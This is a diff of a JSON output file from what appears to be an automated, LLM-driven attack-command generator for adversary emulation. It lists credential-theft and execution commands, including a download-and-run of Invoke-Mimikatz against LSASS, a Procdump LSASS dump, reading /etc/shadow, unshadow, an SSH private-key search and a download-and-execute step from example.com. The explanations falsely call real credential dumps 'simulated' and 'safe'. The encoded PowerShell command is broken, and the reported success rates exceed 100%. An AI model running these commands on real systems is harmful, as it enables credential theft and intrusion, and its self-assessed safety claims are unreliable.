@@ -1,13 +1,13 @@
 {
-  "timestamp": "2025-11-02T13:19:32.418937",
-  "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
+  "timestamp": "2025-11-05T17:48:49.196692",
+  "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
   "test_mode": "real_no_mock",
   "statistics": {
     "agent_info": {
-      "id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
+      "id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
       "name": "test_real_agent",
       "status": "idle",
-      "uptime_seconds": 62.6563
+      "uptime_seconds": 21.412001
     },
     "configuration": {
       "supported_platforms": [
@@ -20,396 +20,183 @@
       "model_name": "gemini-2.0-flash-lite"
     },
     "statistics": {
-      "total_ttps_processed": 6,
-      "total_commands_generated": 15,
+      "total_ttps_processed": 2,
+      "total_commands_generated": 7,
       "commands_by_platform": {
-        "windows": 7,
-        "linux": 8
+        "windows": 3,
+        "linux": 4
       },
       "commands_by_tactic": {
-        "Credential Access": 6,
-        "Lateral Movement": 5,
-        "Initial Access": 2,
-        "Execution": 2
+        "Execution": 4,
+        "Credential Access": 3
       },
       "generation_errors": 0,
       "safety_violations": 0,
-      "successful_generations": 15,
-      "avg_generation_time_ms": 9749.922666666667,
-      "llm_api_calls": 12,
-      "last_generation_time": "2025-11-02T13:19:32.418937"
+      "successful_generations": 7,
+      "avg_generation_time_ms": 9373.189,
+      "llm_api_calls": 4,
+      "last_generation_time": "2025-11-05T17:48:49.196692"
     },
     "performance": {
-      "success_rate": 250.0,
-      "avg_generation_time_ms": 9749.922666666667
+      "success_rate": 350.0,
+      "avg_generation_time_ms": 9373.189
     }
   },
   "execution_result": {
-    "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
+    "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
     "status": "success",
-    "timestamp": "2025-11-02T13:19:32.418937",
+    "timestamp": "2025-11-05T17:48:49.196692",
     "generation_summary": {
-      "ttps_processed": 6,
-      "commands_generated": 15,
+      "ttps_processed": 2,
+      "commands_generated": 7,
       "generation_errors": 0,
-      "processing_time_ms": 58499.536
+      "processing_time_ms": 18746.378
     },
     "attack_commands": [
       {
-        "command_id": "bf9c31a2-0cdd-4a35-b89c-41d18f163675",
-        "ttp_id": "real-T1003",
-        "mitre_attack_id": "T1003",
-        "technique_name": "OS Credential Dumping",
-        "tactic": "Credential Access",
-        "platform": "windows",
-        "name": "Mimikatz - Dump LSASS Credentials (Simulated)",
-        "command": "powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerShellEmpire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command \\\"\"\"sekurlsa::logonpasswords full\\\"\"\" -OutFile C:\\temp\\mimikatz_output.txt\"",
-        "explanation": "This command simulates credential dumping using Mimikatz.  It downloads the Invoke-Mimikatz PowerShell script from a public GitHub repository and executes it.  The script then attempts to extract credentials (hashes and potentially cleartext passwords, depending on the system configuration and user privileges) from the LSASS process. The output is saved to a file for review.  This is a simulated attack because the Mimikatz module is downloaded, not directly executed, making it safer for a testing environment. We also use a file output to prevent credential leakage in the command output.",
-        "indicators": [
-          "Creation of a file: C:\\temp\\mimikatz_output.txt",
-          "Process creation: powershell.exe",
-          "Network connection (if the Invoke-Mimikatz script is not cached)",
-          "File write to a temporary location."
-        ],
-        "prerequisites": [
-          "Internet connectivity (to download Invoke-Mimikatz script)",
-          "PowerShell execution policy allows script execution (or is bypassed)",
-          "Administrative privileges are NOT required for successful execution of the command. It's a simulated attack.",
-          "The target machine must be a Windows system."
-        ],
-        "cleanup": "Remove the created output file: `Remove-Item C:\\temp\\mimikatz_output.txt -Force -ErrorAction SilentlyContinue`",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:18:45.056715",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.813,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "d74d2165-1362-492e-a2a2-b46d99ac2b8a",
-        "ttp_id": "real-T1003",
-        "mitre_attack_id": "T1003",
-        "technique_name": "OS Credential Dumping",
-        "tactic": "Credential Access",
-        "platform": "windows",
-        "name": "Procdump - Dump LSASS Process (Simulated)",
-        "command": "powershell \"$procdumpPath = 'C:\\temp\\procdump.exe'; if (!(Test-Path $procdumpPath)) { (New-Object Net.WebClient).DownloadFile('https://download.sysinternals.com/files/Procdump.zip', 'C:\\temp\\procdump.zip'); Expand-Archive -Path 'C:\\temp\\procdump.zip' -DestinationPath 'C:\\temp\\'; } & $procdumpPath -accepteula -ma lsass C:\\temp\\lsass.dmp\"",
-        "explanation": "This command simulates the process of dumping the LSASS process memory using Procdump. It downloads Procdump from a legitimate Microsoft source (Sysinternals). The command first checks if Procdump is present in the C:\\temp directory. If not, it downloads the zip file, extracts it, and then uses Procdump to create a memory dump of the LSASS process (lsass.exe). The output is saved to a file for later analysis. This is a simulated attack in that the dump file can be analyzed for credentials, but the command itself does not directly extract the credentials. This is also safe because the procdump tool is downloaded from a reputable source, and the file is saved locally.",
-        "indicators": [
-          "File Creation: C:\\temp\\lsass.dmp",
-          "Process creation: procdump.exe",
-          "Network connection (if procdump is not cached)",
-          "File write to a temporary location."
-        ],
-        "prerequisites": [
-          "Internet connectivity (to download Procdump)",
-          "PowerShell execution policy allows script execution (or is bypassed)",
-          "Administrative privileges are required to create a dump of LSASS.",
-          "The target machine must be a Windows system."
-        ],
-        "cleanup": "Remove the created dump file: `Remove-Item C:\\temp\\lsass.dmp -Force -ErrorAction SilentlyContinue`; Remove the downloaded Procdump zip: `Remove-Item C:\\temp\\procdump.zip -Force -ErrorAction SilentlyContinue`; Remove the extracted procdump executable: `Remove-Item C:\\temp\\procdump.exe -Force -ErrorAction SilentlyContinue`",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:18:45.056715",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.813,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "6fc0e330-f763-4b88-9f40-aa6fd5d08dd5",
-        "ttp_id": "real-T1003",
-        "mitre_attack_id": "T1003",
-        "technique_name": "OS Credential Dumping",
-        "tactic": "Credential Access",
-        "platform": "linux",
-        "name": "Dump Shadow File Contents (T1003.002)",
-        "command": "sudo cat /etc/shadow",
-        "explanation": "This command attempts to dump the contents of the /etc/shadow file, which stores hashed passwords for user accounts.  It uses `cat` to read the file and `sudo` to elevate privileges, as reading /etc/shadow requires root access. This is a common method for credential dumping on Linux.",
-        "indicators": [
-          "Presence of /etc/shadow contents in command output",
-          "Event logs indicating `cat` execution with elevated privileges (sudo)",
-          "Potentially, successful retrieval of password hashes."
-        ],
-        "prerequisites": [
-          "Root or sudo privileges required.",
-          "A Linux system with a /etc/shadow file (which is standard)."
-        ],
-        "cleanup": "No specific cleanup needed; the command only reads data.  Ensure root access is properly managed after testing.",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:18:57.035400",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.813,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "d516b81d-878e-4b50-9320-c9ca6b0adcf9",
-        "ttp_id": "real-T1003",
-        "mitre_attack_id": "T1003",
-        "technique_name": "OS Credential Dumping",
-        "tactic": "Credential Access",
-        "platform": "linux",
-        "name": "Access /proc Files to Extract Password Information (T1003.001)",
-        "command": "find /proc -maxdepth 1 -name \"*/cmdline\" -print0 | xargs -0 grep -E -i \"password|passphrase|secret\" || echo \"No sensitive information found in cmdline files.\"",
-        "explanation": "This command searches the /proc filesystem for processes that might contain sensitive information in their command line arguments. It uses `find` to locate cmdline files within /proc, then `xargs` to pass those filenames to `grep`.  `grep` then searches for keywords like 'password', 'passphrase', or 'secret'. This technique tries to find clear-text credentials passed as command line arguments to running processes. The `|| echo` is included for graceful handling if no credentials are found.",
-        "indicators": [
-          "Output from grep containing potential credential information (e.g., passwords or secrets).",
-          "Event logs showing `find`, `xargs`, and `grep` executions.",
-          "Potentially, the identification of processes exposing credentials."
-        ],
-        "prerequisites": [
-          "A Linux system with a /proc filesystem (which is standard).",
-          "User account with permissions to read /proc files (typically standard users have access)."
-        ],
-        "cleanup": "No specific cleanup needed; the command only reads data from the /proc filesystem.  The /proc filesystem is dynamic and self-cleans.",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:18:57.035400",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.813,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "c6cf2405-0e17-4f92-9189-4d23a752e87b",
-        "ttp_id": "real-T1021.001",
-        "mitre_attack_id": "T1021.001",
-        "technique_name": "Remote Desktop Protocol",
-        "tactic": "Lateral Movement",
-        "platform": "windows",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
-        "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
-        ],
-        "prerequisites": [
-          "PowerShell available"
-        ],
-        "cleanup": "No cleanup required",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:18:57.581307",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.803,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "d013dcd8-b3d9-4dc0-b1ac-0214d7cabc28",
-        "ttp_id": "real-T1021.001",
-        "mitre_attack_id": "T1021.001",
-        "technique_name": "Remote Desktop Protocol",
-        "tactic": "Lateral Movement",
-        "platform": "linux",
-        "name": "Establish RDP Connection to a Windows Host using `rdesktop` (Simulated Lateral Movement)",
-        "command": "rdesktop -g 1024x768 <TARGET_IP>:<PORT> -u <USERNAME> -p '<PASSWORD>'",
-        "explanation": "This command attempts to establish an RDP connection to a Windows host using the `rdesktop` client. This simulates an adversary using valid credentials to move laterally.  `<TARGET_IP>` should be the IP address of a Windows machine accessible from the testing Linux environment. `<PORT>` is the RDP port (typically 3389). `<USERNAME>` and `<PASSWORD>` are the credentials for a valid user on the target Windows system.  The `-g 1024x768` option sets the screen resolution for the RDP session.",
-        "indicators": [
-          "Network connection to the target IP address on port 3389 (or specified port) from the attacking machine.",
-          "Logs on the target Windows system indicating a successful login from the specified user and source IP address (Event ID 4624 in Windows Event Viewer).",
-          "`rdesktop` process running on the attacking Linux machine.",
-          "Potential firewall logs on either the attacking or target machine.",
-          "Security logs on the Windows host may show account lockouts if credentials are incorrect."
-        ],
-        "prerequisites": [
-          "The attacking Linux machine must have `rdesktop` installed (e.g., `sudo apt install rdesktop` on Debian/Ubuntu).",
-          "Network connectivity between the attacking Linux machine and the target Windows machine.",
-          "Valid credentials (username and password) for a user account on the target Windows machine.",
-          "The target Windows machine must have RDP enabled and accessible from the network.",
-          "The Linux testing machine must be able to resolve and connect to the Windows machine by its IP address or hostname."
-        ],
-        "cleanup": "Close the `rdesktop` session.  No specific cleanup is usually required beyond closing the session and ensuring that you have not left any sensitive information (like passwords) in your command history or scripts.",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:16.527770",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.803,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "5d2f0c4b-3826-479d-af77-942964f02a6a",
-        "ttp_id": "real-T1021.001",
-        "mitre_attack_id": "T1021.001",
-        "technique_name": "Remote Desktop Protocol",
-        "tactic": "Lateral Movement",
-        "platform": "linux",
-        "name": "Attempt RDP connection to a Windows Host using `xfreerdp` with a compromised password (Simulated Failed Lateral Movement)",
-        "command": "xfreerdp /v:<TARGET_IP>:<PORT> /u:<USERNAME> /p:<WRONG_PASSWORD> /cert-ignore",
-        "explanation": "This command leverages the `xfreerdp` client to attempt an RDP connection to a Windows host. It simulates a failed lateral movement attempt by using an incorrect password (`<WRONG_PASSWORD>`). The `/cert-ignore` option is used to bypass certificate warnings, common in testing environments.  `<TARGET_IP>` and `<PORT>` are the target Windows machine's IP address and RDP port, respectively. `<USERNAME>` is a valid username on the target system.",
-        "indicators": [
-          "Network connection to the target IP address on port 3389 (or specified port) from the attacking machine.",
-          "Failed login attempts logged on the target Windows system (Event ID 4625 in Windows Event Viewer).",
-          "Error messages from `xfreerdp` on the attacking Linux machine indicating authentication failure.",
-          "Potential account lockout on the target Windows system if the incorrect password is used repeatedly.",
-          "`xfreerdp` process running on the attacking Linux machine."
-        ],
-        "prerequisites": [
-          "The attacking Linux machine must have `xfreerdp` installed (e.g., `sudo apt install freerdp-x11` on Debian/Ubuntu).",
-          "Network connectivity between the attacking Linux machine and the target Windows machine.",
-          "A valid username for an account on the target Windows machine, and a password known to be incorrect (or account lockout enabled).",
-          "The target Windows machine must have RDP enabled and accessible from the network.",
-          "The Linux testing machine must be able to resolve and connect to the Windows machine by its IP address or hostname."
-        ],
-        "cleanup": "Close the `xfreerdp` session if it doesn't close on its own. Ensure no sensitive information is left in command history. Consider resetting the password of the test account if it was locked out.",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:16.527770",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.803,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "cb3244a0-fc35-4805-aaa5-476c6943cac0",
-        "ttp_id": "real-T1566.001",
-        "mitre_attack_id": "T1566.001",
-        "technique_name": "Spearphishing Attachment",
-        "tactic": "Initial Access",
-        "platform": "windows",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
-        "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
-        ],
-        "prerequisites": [
-          "PowerShell available"
-        ],
-        "cleanup": "No cleanup required",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:17.022546",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.792,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "350b87bf-1b02-4712-9b04-f6e173e94573",
-        "ttp_id": "real-T1566.001",
-        "mitre_attack_id": "T1566.001",
-        "technique_name": "Spearphishing Attachment",
-        "tactic": "Initial Access",
-        "platform": "linux",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
-        "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
-        ],
-        "prerequisites": [
-          "PowerShell available"
-        ],
-        "cleanup": "No cleanup required",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:17.456564",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.792,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "b9ddf6e0-f42b-484a-ac79-73342819f526",
+        "command_id": "3118ad4a-f043-40a5-809f-c66b9f54965c",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "windows",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
+        "name": "Download and Execute a Simple Script from a Webserver",
+        "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/test.ps1' -OutFile 'C:\\Users\\Public\\test.ps1'; C:\\Users\\Public\\test.ps1\"",
+        "explanation": "This command downloads a PowerShell script named 'test.ps1' from a webserver (example.com).  The script is saved to the public user directory and then executed. The 'test.ps1' script on the webserver could contain benign commands, such as writing a file to disk or displaying a message.  This simulates a common adversary tactic of downloading and executing a payload.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
+          "Network connection to example.com (HTTP traffic)",
+          "Creation of the file C:\\Users\\Public\\test.ps1",
+          "Execution of powershell.exe",
+          "Event logs indicating script execution (e.g., Event ID 4104 in the PowerShell Operational log)"
         ],
         "prerequisites": [
-          "PowerShell available"
+          "A webserver hosting a file named 'test.ps1'. The contents of the file should be safe (e.g., Write-Host 'Hello from the test script!')",
+          "Network connectivity from the target machine to the webserver.",
+          "A user account with permissions to create files in the C:\\Users\\Public directory and execute PowerShell scripts."
         ],
-        "cleanup": "No cleanup required",
+        "cleanup": "Remove the downloaded script: `Remove-Item 'C:\\Users\\Public\\test.ps1' -Force`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:29.836533",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.88,
+        "generated_at": "2025-11-05T17:48:38.103236",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.845,
         "safety_level": "medium",
-        "validated": true
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
       },
       {
-        "command_id": "395afa6c-28c7-4853-b750-6ed0abd74825",
+        "command_id": "f646d5c0-5b35-41c0-9abb-b0fefd93fee9",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
+        "platform": "windows",
+        "name": "Execute a Base64 Encoded PowerShell Script",
+        "command": "powershell -EncodedCommand JABzAGUAbABmAGUAcwB0AGEAcgB0ACAAPQAgACcAVwBoAGUAcgBlACAAdQBzAGUAcgAgAGkAcwAgACcAUwB5AHMAdABlAG0AIgAnACwAIAB1AHMAZQByAG4AYQBtAGUAcwAgAD0AIAB1AHMAZQByAG4AYQBtAGUAcwAgAC0AbgBvAHQAIABuAHUAbABsACwAIAB1AHMAZQByAG4AYQBtAGUAcwAgAC0AbgBvAHQAIABhAG4AZABlAHIAcgBvAHIA';  Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($sEAfA))))",
+        "explanation": "This command executes a base64 encoded PowerShell script. The script, when decoded, retrieves system information. This simulates an attacker obfuscating their commands to evade detection. The example uses a simple encoded command to get the username.  This tests the ability of a security system to detect encoded PowerShell execution.",
+        "indicators": [
+          "Execution of powershell.exe with the -EncodedCommand parameter.",
+          "Event logs indicating script execution (e.g., Event ID 4104 in the PowerShell Operational log). Examine the event data for the decoded script contents.  The encoded command itself will also be logged.",
+          "Process creation events for powershell.exe"
+        ],
+        "prerequisites": [
+          "A Windows environment with PowerShell installed.",
+          "A user account with permissions to execute PowerShell scripts."
+        ],
+        "cleanup": "No cleanup is strictly necessary as the script only retrieves information.  However, for more complex payloads, ensure to clean up any temporary files or changes the script might have made.",
+        "source": "gemini_llm",
+        "generated_at": "2025-11-05T17:48:38.103236",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.845,
+        "safety_level": "medium",
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
+      },
+      {
+        "command_id": "a3d8ba41-c5d7-4aa8-ae13-e98842135b3f",
         "ttp_id": "real-T1059.001",
         "mitre_attack_id": "T1059.001",
         "technique_name": "PowerShell",
         "tactic": "Execution",
         "platform": "linux",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
+        "name": "Simulate PowerShell script execution via pwsh on Linux, downloading a harmless text file.",
+        "command": "pwsh -c \"Invoke-WebRequest -Uri 'https://www.example.com/robots.txt' -OutFile '/tmp/robots.txt'\"",
+        "explanation": "This command simulates the execution of a PowerShell script on a Linux system using `pwsh`. It uses `Invoke-WebRequest` (similar to `curl` or `wget`) to download the `robots.txt` file from example.com and saves it to `/tmp/robots.txt`. This emulates the attacker downloading a payload. The robots.txt file is harmless and publicly accessible.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
+          "Creation of the `/tmp/robots.txt` file.",
+          "Process execution of `pwsh`.",
+          "Network connection to www.example.com on port 443 (HTTPS).",
+          "Log entries in system logs (e.g., /var/log/syslog or audit logs) related to `pwsh` execution and file creation."
         ],
         "prerequisites": [
-          "PowerShell available"
+          "pwsh must be installed on the Linux system. This is typically done via the package manager (e.g., `apt install powershell` on Debian/Ubuntu or `dnf install powershell` on Fedora/CentOS/RHEL).",
+          "Network connectivity is required for the download."
         ],
-        "cleanup": "No cleanup required",
+        "cleanup": "Remove the downloaded file: `rm /tmp/robots.txt`",
         "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:30.268286",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.88,
+        "generated_at": "2025-11-05T17:48:43.179509",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.845,
         "safety_level": "medium",
-        "validated": true
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
       },
       {
-        "command_id": "1c63766f-140d-4503-b910-0857d7063022",
-        "ttp_id": "real-T1021.001",
-        "mitre_attack_id": "T1021.001",
-        "technique_name": "Remote Desktop Protocol",
-        "tactic": "Lateral Movement",
-        "platform": "windows",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
-        "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
-        ],
-        "prerequisites": [
-          "PowerShell available"
-        ],
-        "cleanup": "No cleanup required",
-        "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:30.862549",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.838,
-        "safety_level": "medium",
-        "validated": true
-      },
-      {
-        "command_id": "002c5d24-96e7-418f-ae4f-a552b9cfe820",
-        "ttp_id": "real-T1021.001",
-        "mitre_attack_id": "T1021.001",
-        "technique_name": "Remote Desktop Protocol",
-        "tactic": "Lateral Movement",
+        "command_id": "00695d9f-85fd-4a94-a1f0-9df194f81e11",
+        "ttp_id": "real-T1059.001",
+        "mitre_attack_id": "T1059.001",
+        "technique_name": "PowerShell",
+        "tactic": "Execution",
         "platform": "linux",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
+        "name": "Execute a PowerShell command to display system information on Linux.",
+        "command": "pwsh -c \"Get-ComputerInfo | Out-String\"",
+        "explanation": "This command executes a simple PowerShell command using `pwsh`. The `Get-ComputerInfo` cmdlet retrieves system information, and `Out-String` formats the output as a string.  This is designed to execute a benign command that extracts information about the system, similar to how an attacker might begin their reconnaissance phase.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
+          "Process execution of `pwsh`.",
+          "Output of system information to the console (stdout).",
+          "Log entries in system logs (e.g., /var/log/syslog or audit logs) related to `pwsh` execution."
         ],
         "prerequisites": [
-          "PowerShell available"
+          "pwsh must be installed on the Linux system (see previous example)."
         ],
-        "cleanup": "No cleanup required",
+        "cleanup": "There is no persistent data created or modified, so no cleanup is required.",
         "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:31.376119",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.838,
+        "generated_at": "2025-11-05T17:48:43.179509",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.845,
         "safety_level": "medium",
-        "validated": true
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
       },
       {
-        "command_id": "bb2493bb-5b68-4c86-8e91-dcb00964d273",
+        "command_id": "64d1cd41-d013-471f-936d-301e2a8ff5c5",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
@@ -427,58 +214,110 @@
         ],
         "cleanup": "No cleanup required",
         "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:31.891331",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.833,
+        "generated_at": "2025-11-05T17:48:43.642993",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.813,
         "safety_level": "medium",
-        "validated": true
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
       },
       {
-        "command_id": "a1084f4b-6cca-435c-a349-a7141905fefd",
+        "command_id": "ea93e3e8-f538-4a84-80f0-aaef34fa122d",
         "ttp_id": "real-T1003",
         "mitre_attack_id": "T1003",
         "technique_name": "OS Credential Dumping",
         "tactic": "Credential Access",
         "platform": "linux",
-        "name": "Mock PowerShell Command",
-        "command": "Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}",
-        "explanation": "This is a mock command for testing purposes",
+        "name": "Dump Shadow File with `unshadow`",
+        "command": "unshadow /etc/shadow /etc/passwd > creds.txt",
+        "explanation": "This command attempts to extract password hashes from the shadow and passwd files. The `unshadow` utility merges the shadow and passwd files, allowing for offline password cracking of user accounts. The output is redirected to a file named 'creds.txt'. This simulates credential dumping by making password hashes accessible.",
         "indicators": [
-          "PowerShell execution",
-          "Process enumeration"
+          "Creation of creds.txt file containing password hashes and user account information.",
+          "Access to /etc/shadow and /etc/passwd files in audit logs (if enabled).",
+          "Presence of 'unshadow' utility execution in process logs."
         ],
         "prerequisites": [
-          "PowerShell available"
+          "Access to a Linux system with the `unshadow` utility installed (usually comes with the `john` or `hashcat` packages).",
+          "Permissions to read /etc/shadow and /etc/passwd (typically root or sudo privileges are required)."
         ],
-        "cleanup": "No cleanup required",
+        "cleanup": "rm creds.txt",
         "source": "gemini_llm",
-        "generated_at": "2025-11-02T13:19:32.418937",
-        "agent_id": "1a41f894-fbf6-4181-a737-ec1aa3e4e8ac",
-        "confidence_score": 0.833,
+        "generated_at": "2025-11-05T17:48:49.196692",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.813,
         "safety_level": "medium",
-        "validated": true
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
+      },
+      {
+        "command_id": "a1aa5100-e58c-4bce-a92c-8724c45b08a6",
+        "ttp_id": "real-T1003",
+        "mitre_attack_id": "T1003",
+        "technique_name": "OS Credential Dumping",
+        "tactic": "Credential Access",
+        "platform": "linux",
+        "name": "Extract SSH Private Key with `find` and `grep`",
+        "command": "find /home -type f -name \"id_rsa\" -print0 | xargs -0 grep -l \"PRIVATE KEY\"",
+        "explanation": "This command simulates credential access by attempting to locate SSH private keys on the system. It uses `find` to locate files named 'id_rsa' (the default name for SSH private key files).  Then, `grep` searches within those files for the string \"PRIVATE KEY\", which is a characteristic marker of SSH private keys. This aims to identify potential keys for privilege escalation or lateral movement. The output will be a list of paths to any found id_rsa files.",
+        "indicators": [
+          "Execution of find and grep commands.",
+          "Output listing potential SSH private key file paths.",
+          "Access to user home directories in audit logs (if enabled).",
+          "Possible file access events for id_rsa files."
+        ],
+        "prerequisites": [
+          "Access to a Linux system.",
+          "Sufficient permissions to read the home directories of target users (may require sudo)."
+        ],
+        "cleanup": "No specific cleanup needed; the command only reads files.",
+        "source": "gemini_llm",
+        "generated_at": "2025-11-05T17:48:49.196692",
+        "agent_id": "994f318c-44db-4537-a0c6-d2d08a3c29db",
+        "confidence_score": 0.813,
+        "safety_level": "medium",
+        "validated": true,
+        "metadata": {
+          "threat_actor": "lazarus group",
+          "campaign": "Lazarus Group - Credential Harvesting Campaign Using Mimikatz",
+          "malware_used": [
+            "mimikatz",
+            "Mimikatz"
+          ]
+        }
       }
     ],
     "errors": [],
     "statistics": {
-      "total_ttps_processed": 6,
-      "total_commands_generated": 15,
+      "total_ttps_processed": 2,
+      "total_commands_generated": 7,
       "commands_by_platform": {
-        "windows": 7,
-        "linux": 8
+        "windows": 3,
+        "linux": 4
       },
       "commands_by_tactic": {
-        "Credential Access": 6,
-        "Lateral Movement": 5,
-        "Initial Access": 2,
-        "Execution": 2
+        "Execution": 4,
+        "Credential Access": 3
       },
       "generation_errors": 0,
       "safety_violations": 0,
-      "successful_generations": 15,
-      "avg_generation_time_ms": 9749.922666666667,
-      "llm_api_calls": 12,
-      "last_generation_time": "2025-11-02T13:19:32.418937"
+      "successful_generations": 7,
+      "avg_generation_time_ms": 9373.189,
+      "llm_api_calls": 4,
+      "last_generation_time": "2025-11-05T17:48:49.196692"
     }
   }
 }
